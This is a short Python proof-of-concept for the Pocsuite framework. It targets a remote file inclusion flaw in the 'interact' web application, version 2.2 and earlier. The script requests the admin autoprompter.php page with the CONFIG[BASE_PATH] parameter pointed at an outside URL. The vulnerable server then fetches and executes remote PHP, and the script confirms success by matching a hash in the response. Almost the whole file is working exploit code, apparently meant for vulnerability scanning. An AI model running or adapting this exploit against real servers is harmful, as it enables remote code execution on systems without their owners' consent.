#!/usr/bin/env python
# coding: utf-8

import re
from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register

class interact_Remote_File_Include(POCBase):
    vulID = '63658'
    version = '1'
    vulDate = '2006-08-19'
    author = ' '
    createDate = '2015-12-16'
    updateDate = ' '
    references = ['http://www.sebug.net/vuldb/ssvid-63658']
    name = 'interact <= 2.2 (CONFIG[BASE_PATH]) Remote File Include Vulnerability'
    appPowerLink = 'https://sourceforge.net/projects/cce-interact/'
    appName = 'interact'
    appVersion = '<= 2.2'
    vulType = 'Remote File Inclusion'
    desc = ''
    samples = ['']


    def _attack(self):
        return self._verify()


    def _verify(self):
        result = {}
        vul_url = '%s/admin/autoprompter.php?CONFIG[BASE_PATH]=[http://tool.scanv.com/wsl/php_verify.txt?]' % self.url
        response = req.get(vul_url).content

        if re.search('d4d7a6b8b3ed8ed86db2ef2cd728d8ec', response):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url


        return self.parse_attack(result)


    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output

register(interact_Remote_File_Include)